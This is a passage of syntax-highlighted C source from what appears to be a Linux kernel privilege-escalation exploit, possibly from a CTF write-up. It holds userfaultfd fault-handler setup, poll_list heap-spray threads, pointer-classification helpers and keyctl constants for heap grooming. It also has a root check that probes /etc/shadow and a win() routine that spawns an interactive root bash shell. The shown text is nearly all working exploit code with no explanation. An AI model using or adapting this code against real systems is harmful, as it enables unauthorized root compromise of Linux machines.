</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">page</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">page</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">page</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="o">-</span><span class="mh">0x30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">page</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">page</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc</span><span class="p">.</span><span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc</span><span class="p">.</span><span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">msg</span><span class="p">.</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc</span><span class="p">.</span><span class="n">copy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_COPY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">registerUserfault</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">fault_page</span><span class="p">,</span><span class="kt">void</span> <span class="o">*</span><span class="n">handler</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="kt">pthread_t</span> <span class="n">thr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">struct</span> <span class="n">uffdio_api</span> <span class="n">ua</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">struct</span> <span class="n">uffdio_register</span> <span class="n">ur</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="kt">uint64_t</span> <span class="n">uffd</span>  <span class="o">=</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_userfaultfd</span><span class="p">,</span> <span class="n">O_CLOEXEC</span> <span class="o">|</span> <span class="n">O_NONBLOCK</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="n">ua</span><span class="p">.</span><span class="n">api</span> <span class="o">=</span> <span class="n">UFFD_API</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="n">ua</span><span class="p">.</span><span class="n">features</span>    <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_API</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ua</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;[-] ioctl-UFFDIO_API&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">   <span class="n">ur</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fault_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="n">ur</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">len</span>   <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="n">ur</span><span class="p">.</span><span class="n">mode</span>        <span class="o">=</span> <span class="n">UFFDIO_REGISTER_MODE_MISSING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_REGISTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ur</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;[-] ioctl-UFFDIO_REGISTER&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">thr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span><span class="n">handler</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">uffd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="o">!=</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;[-] pthread_create&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">check_root</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/etc/shadow&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">check_root</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] We are Ro0ot!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s">&#34;-i&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="nf">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">is_kernel_pointer</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="n">KERNEL_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">KERNEL_MASK</span><span class="p">)</span> <span class="o">?</span> <span class="nb">true</span> <span class="o">:</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">is_heap_pointer</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(((</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="n">HEAP_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">HEAP_MASK</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">is_kernel_pointer</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span> <span class="o">?</span> <span class="nb">true</span> <span class="o">:</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">__pause</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Paused - %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">randint</span><span class="p">(</span><span class="kt">int</span> <span class="n">min</span><span class="p">,</span> <span class="kt">int</span> <span class="n">max</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">min</span> <span class="o">+</span> <span class="p">(</span><span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="p">(</span><span class="n">max</span> <span class="o">-</span> <span class="n">min</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">assign_to_core</span><span class="p">(</span><span class="kt">int</span> <span class="n">core_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">cpu_set_t</span> <span class="n">mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mask</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">CPU_SET</span><span class="p">(</span><span class="n">core_id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mask</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">sched_setaffinity</span><span class="p">(</span><span class="nf">getpid</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mask</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">mask</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] sched_setaffinity()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">hexdump</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;  </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;  %04x  &#34;</span><span class="p">,</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;0x%016lx&#34;</span><span class="p">,</span> <span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;    &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">assign_thread_to_core</span><span class="p">(</span><span class="kt">int</span> <span class="n">core_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">cpu_set_t</span> <span class="n">mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mask</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">CPU_SET</span><span class="p">(</span><span class="n">core_id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mask</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">pthread_setaffinity_np</span><span class="p">(</span><span class="nf">pthread_self</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mask</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">mask</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] assign_thread_to_core_range()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init_fd</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/etc/passwd&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] init_fd()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">alloc_poll_list</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">pollfd</span> <span class="o">*</span><span class="n">pfds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">nfds</span><span class="p">,</span> <span class="n">timer</span><span class="p">,</span> <span class="n">id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">suspend</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">id</span>    <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">t_args</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">nfds</span>  <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">t_args</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">nfds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">timer</span> <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">t_args</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">suspend</span> <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">t_args</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">suspend</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">pfds</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="n">nfds</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">pollfd</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nfds</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fds</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLERR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">assign_thread_to_core</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mutex</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">poll_threads</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mutex</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">debug</span><span class="p">(</span><span class="s">&#34;[Thread %d] Start polling...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">poll</span><span class="p">(</span><span class="n">pfds</span><span class="p">,</span> <span class="n">nfds</span><span class="p">,</span> <span class="n">timer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">debug</span><span class="p">(</span><span class="s">&#34;[Thread %d] Polling complete: %d!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">id</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">assign_thread_to_core</span><span class="p">(</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">suspend</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>   
</span></span><span class="line"><span class="cl">        <span class="nf">debug</span><span class="p">(</span><span class="s">&#34;[Thread %d] Suspending thread...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mutex</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">poll_threads</span><span class="o">--</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mutex</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">create_poll_thread</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timer</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">suspend</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">t_args</span> <span class="o">*</span><span class="n">args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">t_args</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">PAGE_SIZE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="p">((</span><span class="n">size</span><span class="o">/</span><span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">poll_list</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">args</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">args</span><span class="o">-&gt;</span><span class="n">nfds</span> <span class="o">=</span> <span class="nf">NFDS</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">args</span><span class="o">-&gt;</span><span class="n">timer</span> <span class="o">=</span> <span class="n">timer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">args</span><span class="o">-&gt;</span><span class="n">suspend</span> <span class="o">=</span> <span class="n">suspend</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">poll_tid</span><span class="p">[</span><span class="n">id</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">alloc_poll_list</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">join_poll_threads</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">poll_threads</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_join</span><span class="p">(</span><span class="n">poll_tid</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// open(&#34;/proc/self/stat&#34;, O_RDONLY);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="n">poll_threads</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define KEY_SPEC_PROCESS_KEYRING	-2	</span><span class="cm">/* - key ID for process-specific keyring */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define KEYCTL_UPDATE			2	</span><span class="cm">/* update a key */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define KEYCTL_REVOKE			3	</span><span class="cm">/* revoke a key */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define KEYCTL_UNLINK			9	</span><span class="cm">/* unlink a key from a keyring */</span><span class="cp">
